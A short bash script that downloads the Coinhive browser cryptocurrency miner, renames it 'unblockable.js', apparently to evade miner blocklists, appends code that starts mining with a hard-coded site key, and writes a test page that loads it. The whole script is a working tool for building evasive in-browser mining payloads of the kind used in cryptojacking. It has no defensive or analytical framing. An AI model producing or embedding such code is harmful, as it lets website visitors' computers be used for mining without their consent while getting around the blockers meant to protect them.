#!/bin/bash
THROTTLE=0.5
SITE_KEY=Z892nG4sVMkhf7VsF3Z5KOlD6fpCzKqo
SCRIPT_NAME=unblockable.js

echo "Downloading coinhive.min.js..."
wget https://coinhive.com/lib/coinhive.min.js -q -O $SCRIPT_NAME
echo "Generating $SCRIPT_NAME..."
echo "var miner=new CoinHive.Anonymous('$SITE_KEY',{throttle:$THROTTLE});miner.start();" >> $SCRIPT_NAME
echo -e "<p>Mining with throttle $THROTTLE for $SITE_KEY</p>\n<script src=\"$SCRIPT_NAME\"></script>" > test.html
echo "Done!"
